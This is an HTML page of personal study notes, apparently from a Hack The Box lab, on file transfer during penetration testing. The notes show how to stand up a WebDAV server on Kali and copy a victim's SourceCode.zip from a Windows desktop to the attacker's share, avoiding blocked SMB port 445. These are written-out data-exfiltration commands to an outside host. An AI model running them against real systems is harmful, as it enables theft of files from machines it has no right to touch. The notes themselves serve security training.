<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SMB Share Upload</title>
</head><body>See impacket SMB downloads.<br/>
<br/>
ERROR HANDLING &amp; BUT:<br/>
Most companies don't allow 445 smb share connections, but you can use WebDAV(RFC 4918)<br/>
It is an extension of Http (can also use https) and makes a webserver behave like an smb but on port 80/443<br/>
<br/>
Install WebDav server on kali:<ul><li style="list-style-type: none">Momothechi@htb[/htb]$ sudo pip3 install wsgidav cheroot </li>
</ul>
Using the python module:<ul><li style="list-style-type: none">sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous &nbsp; </li>
</ul>
Accessing the SMB share on the windows host:<ul><li style="list-style-type: none">C:\htb&gt; dir \\192.168.49.128\DavWWWRoot &nbsp;</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">note: DavWWWRoot is a keyword in the Windows shell it tells the driver to connect to the root of the WebDav server.</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">alternatively you can also specify a specific folder if it exists:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">\192.168.49.128\sharefolder</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
Now we can upload files:<ul><li style="list-style-type: none">C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ </li>
<li style="list-style-type: none">C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\ &nbsp;</li>
</ul>
</body></html>